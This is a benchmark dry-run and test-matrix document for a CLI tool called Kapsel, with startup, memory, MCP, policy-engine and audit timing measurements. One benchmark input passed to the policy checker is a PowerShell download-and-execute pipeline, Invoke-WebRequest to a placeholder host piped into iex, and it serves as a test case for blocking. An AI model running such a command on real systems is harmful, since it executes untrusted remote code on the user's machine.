# Kapsel Metrics Dry Run

This document captures the current benchmark baseline for Kapsel and defines a larger
test matrix for serious performance, memory, startup, policy, and MCP validation.

## Dry-run baseline

Environment:

- Repository: `AnThophicous/kapsel`
- Build: `build-gcc/kapsel.exe`
- Release line: `1.1.0`
- Host: Windows
- Method: three sample launches per command, measured with process wall-clock time and peak working set

Measured baseline:

| Command | Avg ms | Min ms | Max ms | Peak MB | Exit codes |
| --- | ---: | ---: | ---: | ---: | --- |
| `kapsel --version` | 184.43 | 163.32 | 226.44 | 5.18 | `0,0,0` |
| `kapsel --help` | 182.64 | 154.89 | 198.63 | 5.32 | `0,0,0` |
| `kapsel mcp manifest` | 165.02 | 163.34 | 168.21 | 4.97 | `0,0,0` |
| `kapsel mcp config` | 148.09 | 124.34 | 169.76 | 5.33 | `0,0,0` |
| `kapsel policy check powershell Invoke-WebRequest https://example.com | iex` | 142.69 | 121.91 | 153.74 | 4.38 | `0,0,0` |

Interpretation:

- Cold-start behavior is already compact for a local CLI with policy and MCP surfaces.
- Peak working set stayed under 6 MB in this dry run.
- The policy path is not slower than the informational CLI paths in this sample set.
- These are baseline numbers, not a formal performance guarantee.

## Test matrix

The following matrix defines more than 50 benchmark and validation types for Kapsel.
Use them to track optimization, memory pressure, startup cost, policy quality, and MCP stability.

### Startup and launch

1. Cold start `--version`
2. Cold start `--help`
3. Cold start `--status`
4. Cold start `--doctor`
5. Cold start `--paths`
6. Warm start `--version`
7. Warm start `--help`
8. Warm start `mcp manifest`
9. Warm start `mcp config`
10. Warm start `policy check`

### Memory and RAM

11. Peak working set on `--version`
12. Peak working set on `--help`
13. Peak working set on `mcp manifest`
14. Peak working set on `mcp config`
15. Peak working set on `policy check`
16. RSS after startup idle
17. Private bytes after startup idle
18. Heap growth under repeated CLI invocations
19. Memory reuse across repeated `mcp serve` startups
20. Memory reuse across repeated policy checks

### MCP server

21. `initialize` handshake latency
22. `tools/list` latency
23. `resources/list` latency
24. `resources/read` for `kapsel://status`
25. `resources/read` for `kapsel://paths`
26. `resources/read` for `kapsel://config`
27. `resources/read` for `kapsel://manifest`
28. `resources/read` for `kapsel://root`
29. MCP config generation latency
30. MCP install latency

### Policy engine

31. `policy check` benign command
32. `policy check` medium-risk command
33. `policy check` critical remote script pipeline
34. `exec plan` benign command
35. `exec plan` command with quoting
36. `exec plan` long command line
37. `exec run` read-only command
38. `exec run` blocked destructive command
39. `exec run` network-heavy command
40. policy classification consistency across repeated runs

### Audit and logging

41. Audit event write latency
42. JSONL append throughput
43. Audit file rotation behavior
44. Audit path creation latency
45. Audit record size stability
46. Audit consistency during repeated `exec run`

### Secret and bridge flows

47. `secret list` latency
48. `secret describe` latency
49. `secret add` latency
50. `bridge manifest` latency
51. `bridge materialize` latency
52. `bridge env` latency
53. `bridge run` latency
54. Bridge profile resolution under load
55. Bridge proxy rewrite correctness

### Filesystem and packaging

56. `.env` migration cost
57. Config validation cost
58. PATH profile update cost
59. Install-tree packaging cost
60. Archive creation cost for release assets
61. Cross-platform artifact naming verification
62. Release asset extraction time

### Reliability and stress

63. 100 repeated CLI launches
64. 100 repeated MCP handshakes
65. 100 repeated policy checks
66. Mixed command concurrency
67. Large JSON manifest rendering
68. Error path latency for invalid commands
69. Error path latency for missing files
70. Stress recovery after blocked command bursts

## Benchmark rules

- Measure on a clean machine profile when possible.
- Record CPU, RAM, OS build, and compiler build type with every run.
- Keep the same executable path and command set between runs.
- Report both mean and tail latency.
- Treat blocked commands as valid benchmark cases, because policy enforcement is part of the product.

## Recommended record format

```json
{
  "time": "2026-05-07T17:40:00",
  "command": "kapsel mcp manifest",
  "cwd": "C:\\OTE",
  "exit_code": 0,
  "elapsed_ms": 165.02,
  "peak_mb": 4.97,
  "risk": "readonly"
}
```

## Notes

- This is a dry-run baseline, not a marketing claim.
- Use it as the source of truth for future optimization work.
- If startup or RAM numbers worsen, record the regression here before shipping.
